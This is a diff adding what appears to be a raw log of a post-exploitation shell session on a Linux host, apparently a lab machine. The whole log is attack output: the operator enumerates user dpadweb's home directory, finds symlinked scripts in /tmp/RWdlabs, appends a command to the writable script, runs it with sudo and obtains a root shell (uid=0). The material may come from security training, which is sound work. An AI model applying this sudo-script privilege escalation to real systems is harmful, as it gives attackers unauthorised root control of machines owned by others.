@@ -1,0 +1,27 @@
+[*] Waiting for shell...
+id
+uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
+ls -lsa /home/dpadweb
+total 14
+1 drwxr-xr-x 5 dpadweb dlabusers 1024 Mar  6  2014 .
+1 drwxr-xr-x 7 root    root      1024 Jan 21  2014 ..
+1 -rw------- 1 dpadweb dlabusers   52 Dec 21  2010 .Xauthority
+1 -rw------- 1 dpadweb dlabusers  119 Jan 22  2013 .bash_aliases
+1 -rw------- 1 dpadweb dlabusers   10 Oct 23  2012 .bash_history
+1 -rw-r--r-- 1 dpadweb dlabusers  220 Apr 13  2010 .bash_logout
+4 -rw-r--r-- 1 dpadweb dlabusers 3213 Jan 21  2013 .bashrc
+1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .cache
+1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .config
+1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .local
+1 -rw-r--r-- 1 dpadweb dlabusers  675 Apr 13  2010 .profile
+0 lrwxrwxrwx 1 root    root        30 Mar  6  2014 .reboot-script.sh -> /tmp/RWdlabs/.reboot-script.sh
+0 lrwxrwxrwx 1 root    root        24 Jan 21  2014 .rscript.sh -> /tmp/RWdlabs/.rscript.sh
+cat /tmp/RWdlabs/.rscript.sh
+#Insert lines to exec operations as root from dpadweb user
+echo "id" >> /tmp/RWdlabs/.rscript.sh
+
+id
+uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
+sudo /tmp/RWdlabs/.rscript.sh
+uid=0(root) gid=0(root) groups=0(root)
+
